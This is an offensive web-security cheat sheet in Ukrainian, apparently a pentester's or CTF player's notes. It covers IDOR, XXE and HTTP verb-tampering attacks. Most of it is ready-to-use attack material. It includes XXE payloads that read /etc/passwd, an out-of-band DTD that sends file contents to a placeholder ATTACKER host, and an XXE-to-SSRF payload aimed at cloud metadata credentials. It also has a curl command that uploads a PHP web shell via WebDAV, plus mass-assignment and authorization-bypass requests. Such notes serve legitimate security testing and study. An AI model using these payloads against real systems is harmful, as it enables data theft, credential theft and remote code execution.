# Web Attacks — IDOR / XXE / HTTP Verb Tampering

---

## IDOR (Insecure Direct Object Reference)

### Що шукати

```
/api/user/1337          → змінити на /api/user/1
/download?file_id=42    → перебір
/invoice/2024-001.pdf   → предиктивний ID
?uid=currentUser        → замінити на іншого
```

### Horizontal vs Vertical

- **Horizontal:** доступ до чужого ресурсу того ж рівня (`user_id=2` замість свого)
- **Vertical:** отримати функціонал вищого рівня (`role=admin` у JWT/cookie/параметрі)

### Encoded / Hashed IDs

```bash
# base64
echo "dXNlcl8x" | base64 -d      # → user_1

# MD5 перебір (якщо знаєш формат)
echo -n "user_1337" | md5sum
python3 -c "import hashlib; print(hashlib.md5(b'user_42').hexdigest())"
```

### IDOR через JSON / API

```
POST /api/profile/update
{"user_id": 1337, "email": "attacker@evil.com"}
→ змінити user_id на цільового
```

### Mass Assignment

Якщо POST приймає JSON, спробуй додати поля яких нема у формі:
```json
{"username": "test", "role": "admin", "is_active": true}
```

### Чек під час тесту

```
1. Зареєструй 2 акаунти (user_A, user_B)
2. Виконай дію як user_A → перехопи в Burp
3. Відправ той самий запит з cookie/token від user_B
4. Якщо доступ — IDOR підтверджений
```

---

## XXE (XML External Entity)

### Базовий payload — читання файлу

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

### Де шукати XXE

- Будь-який endpoint що приймає XML (Content-Type: application/xml, text/xml)
- SOAP web services
- SVG upload (рендер на сервері)
- DOCX / XLSX / ODT upload (розпакуй zip → редагуй `word/document.xml`)
- RSS/Atom feeds
- Параметр з XML у body навіть якщо Content-Type: JSON → спробуй змінити

### Blind XXE → out-of-band

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % ext SYSTEM "http://ATTACKER/evil.dtd"> %ext;]>
<root/>
```

`evil.dtd` на твоєму сервері:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY send SYSTEM 'http://ATTACKER/?d=%file;'>">
%wrap;
&send;
```

```bash
# Слухай:
python3 -m http.server 80
# або nc -lvnp 80
```

### XXE → SSRF

```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>
```
SSRF через XXE → AWS/GCP metadata → IAM credentials.

### XXE → LFI (PHP wrapper)

```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>
```

### XXE у JSON endpoint

Іноді сервер приймає обидва формати. Перевір:
```
Content-Type: application/xml  (замість application/json)
→ відправ XML body з XXE payload
```

### Remediation (для звіту)

Disable external entity processing; використовуй safe XML parser (defusedxml); whitelist allowed entities.

---

## HTTP Verb Tampering

### Концепція

Сервер може дозволяти методи яких нема у whitelist авторизації. Auth middleware перевіряє GET/POST, але не PUT/DELETE/OPTIONS.

### Bypass авторизації

```bash
# Сторінка повертає 403 на GET:
curl -X POST http://TARGET/admin/users
curl -X PUT  http://TARGET/admin/users
curl -X HEAD http://TARGET/admin/users

# Іноді HEAD проходить і розкриває заголовки без body
# OPTIONS розкриває дозволені методи:
curl -X OPTIONS http://TARGET/ -v
```

### Bypass через заголовки (HTTP Header Injection)

```
X-HTTP-Method: DELETE
X-HTTP-Method-Override: PUT
X-Method-Override: PATCH
```
Деякі фреймворки (Django, Rails, Express) читають ці заголовки і обробляють запит як вказаний метод.

### Verb Tampering у WebDAV

```bash
curl -X PROPFIND http://TARGET/ -H "Depth: 1"     # enum директорій
curl -X PUT http://TARGET/shell.php -d '<?php system($_GET["c"]); ?>'
curl -X MOVE http://TARGET/shell.txt -H "Destination: http://TARGET/shell.php"
```

### Checklist

```
[ ] OPTIONS → дивись Allow: заголовок
[ ] Спробуй PUT/DELETE/PATCH на кожен auth endpoint
[ ] Додай X-HTTP-Method-Override до GET/POST що дають 403
[ ] У WebDAV спробуй PUT + MOVE для upload bypass
```

---

## Загальний Checklist для Web Attacks

```
IDOR
[ ] Два акаунти для cross-account тесту
[ ] Encoded/hashed IDs → декодуй і перебирай
[ ] JSON поля → спробуй mass assignment
[ ] Параметри в URL, cookie, JWT payload, GraphQL

XXE
[ ] Знайди всі XML endpoints (включно з прихованими)
[ ] SVG/DOCX upload → відкрий і встав payload
[ ] Blind XXE → OOB через HTTP server
[ ] XXE → SSRF якщо хмарне середовище

HTTP Verb
[ ] OPTIONS на кожен endpoint
[ ] PUT/DELETE/PATCH на auth-protected routes
[ ] X-HTTP-Method-Override headers
[ ] WebDAV PUT → RCE
```

**Зв'язки:** [[SSRF-SSTI]] · [[File-Upload-Attacks]] · [[SQLi-SQLMap]] · [[Common-Apps]]
